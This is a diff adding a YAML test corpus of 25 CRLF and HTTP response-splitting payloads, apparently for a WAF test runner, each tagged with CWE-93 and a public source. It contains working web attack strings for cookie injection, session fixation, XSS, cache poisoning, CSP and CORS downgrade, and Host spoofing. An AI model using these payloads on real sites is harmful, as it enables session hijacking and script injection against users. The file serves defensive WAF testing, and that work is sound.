@@ -1,0 +1,182 @@
+# CRLF / HTTP response-splitting / header injection — 25 entries. WAF-view only.
+# Sources: PayloadsAllTheThings/CRLF Injection, OWASP WSTG §4.7.12, HackTricks/CRLF.
+# Payloads land in URL query / body strings; the runner's _header_safe sanitiser
+# protects the mutator layer for context_displacement (which moves payloads INTO
+# headers) but NOT the payload-as-string case where CRLF in URL query is the
+# whole point — the WAF is expected to catch encoded CR/LF in user input.
+
+- id: crlf-basic
+  class: crlf
+  payload: "foo%0d%0aSet-Cookie:%20sess=owned"
+  trigger: &T200 { kind: status, code: 200 }
+  cwe: CWE-93
+  source: "OWASP WSTG — CRLF header injection"
+
+- id: crlf-nullbyte
+  class: crlf
+  payload: "foo%0d%0a%00Set-Cookie:%20x=1"
+  trigger: *T200
+  cwe: CWE-93
+  source: "PayloadsAllTheThings — null byte variant"
+
+- id: crlf-double-encoded
+  class: crlf
+  payload: "foo%250d%250aSet-Cookie:%20sess=owned"
+  trigger: *T200
+  cwe: CWE-93
+  source: "CRLF — double URL-encoded"
+
+- id: crlf-triple-encoded
+  class: crlf
+  payload: "foo%25250d%25250aSet-Cookie:%2520x=1"
+  trigger: *T200
+  cwe: CWE-93
+  source: "CRLF — triple URL-encoded (defeats single-pass decoders)"
+
+- id: crlf-split-200
+  class: crlf
+  payload: "foo%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK"
+  trigger: *T200
+  cwe: CWE-93
+  source: "Full response-splitting gadget"
+
+- id: crlf-xss-via-header
+  class: crlf
+  payload: "foo%0d%0aLocation:javascript:alert(1)"
+  trigger: *T200
+  cwe: CWE-93
+  source: "CRLF-chained open redirect → XSS"
+
+- id: crlf-unicode-crlf
+  class: crlf
+  payload: "foo
+X-Injected: 1"
+  trigger: *T200
+  cwe: CWE-93
+  source: "Unicode CR/LF literal (filters that only catch %0d%0a)"
+
+- id: crlf-unicode-overlong
+  class: crlf
+  payload: "fooX-Injected:%201"
+  trigger: *T200
+  cwe: CWE-93
+  source: "U+0085 NEXT LINE — accepted by some Java HTTP parsers"
+
+- id: crlf-tab-cr
+  class: crlf
+  payload: "foo%09%0dContent-Type:%20text/html"
+  trigger: *T200
+  cwe: CWE-93
+  source: "Tab + CR split (some parsers accept)"
+
+- id: crlf-host-header
+  class: crlf
+  payload: "example.com%0d%0aX-Spoofed-Host:evil.com"
+  trigger: *T200
+  cwe: CWE-93
+  source: "Host-header smuggle"
+
+- id: crlf-cookie-smuggle
+  class: crlf
+  payload: "val%0d%0aSet-Cookie:%20admin=1;%20HttpOnly"
+  trigger: *T200
+  cwe: CWE-93
+  source: "Session fixation via cookie smuggle"
+
+- id: crlf-lf-only
+  class: crlf
+  payload: "val%0aX-Bypass:1"
+  trigger: *T200
+  cwe: CWE-93
+  source: "LF-only (some parsers split without CR)"
+
+- id: crlf-cr-only
+  class: crlf
+  payload: "val%0dX-Bypass:1"
+  trigger: *T200
+  cwe: CWE-93
+  source: "CR-only (Apache mod_proxy quirk)"
+
+- id: crlf-content-type-confusion
+  class: crlf
+  payload: "x%0d%0aContent-Type:%20application/json%0d%0a%0d%0a{\"a\":1}"
+  trigger: *T200
+  cwe: CWE-93
+  source: "Content-Type override → parser confusion"
+
+- id: crlf-csp-clobber
+  class: crlf
+  payload: "x%0d%0aContent-Security-Policy:%20default-src%20*"
+  trigger: *T200
+  cwe: CWE-93
+  source: "CSP downgrade via header smuggle"
+
+- id: crlf-cors-clobber
+  class: crlf
+  payload: "x%0d%0aAccess-Control-Allow-Origin:%20*"
+  trigger: *T200
+  cwe: CWE-93
+  source: "CORS smuggle — silent SOP downgrade"
+
+- id: crlf-cache-poison
+  class: crlf
+  payload: "x%0d%0aX-Forwarded-Host:evil.com%0d%0aCache-Control:%20public,max-age=3600"
+  trigger: *T200
+  cwe: CWE-93
+  source: "Cache-poisoning chain via header smuggle"
+
+- id: crlf-xss-body
+  class: crlf
+  payload: "x%0d%0a%0d%0a<script>alert(1)</script>"
+  trigger: *T200
+  cwe: CWE-93
+  source: "Response splitting → injected body XSS"
+
+- id: crlf-utf8-newline
+  class: crlf
+  payload: "x%c4%8d%c4%8aSet-Cookie:%20x=1"
+  trigger: *T200
+  cwe: CWE-93
+  source: "UTF-8 multibyte CR/LF (overlong)"
+
+- id: crlf-x-forwarded-for
+  class: crlf
+  payload: "x%0d%0aX-Forwarded-For:127.0.0.1"
+  trigger: *T200
+  cwe: CWE-93
+  source: "Auth-bypass via X-Forwarded-For smuggle"
+
+- id: crlf-mixed-encoding
+  class: crlf
+  payload: "x%0D%0aSet-Cookie:%20a=b%0D%0AContent-Length:0"
+  trigger: *T200
+  cwe: CWE-93
+  source: "Mixed-case hex (defeats lower-case-only filters)"
+
+- id: crlf-html-encoded
+  class: crlf
+  payload: "x&#13;&#10;Set-Cookie: a=b"
+  trigger: *T200
+  cwe: CWE-93
+  source: "HTML-entity encoded CR/LF"
+
+- id: crlf-trailer-injection
+  class: crlf
+  payload: "x%0d%0aTrailer:%20X-Smuggled%0d%0aTransfer-Encoding:chunked"
+  trigger: *T200
+  cwe: CWE-93
+  source: "Chunked-trailer smuggling primitive"
+
+- id: crlf-host-rebind
+  class: crlf
+  payload: "x%0d%0aHost:%20evil.com%0d%0aConnection:close"
+  trigger: *T200
+  cwe: CWE-93
+  source: "SSRF-flavoured Host rebind"
+
+- id: crlf-set-cookie-overflow
+  class: crlf
+  payload: "v%0d%0aSet-Cookie:%20s=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  trigger: *T200
+  cwe: CWE-93
+  source: "Long-cookie smuggle (defensive cookie-jar abuse)"
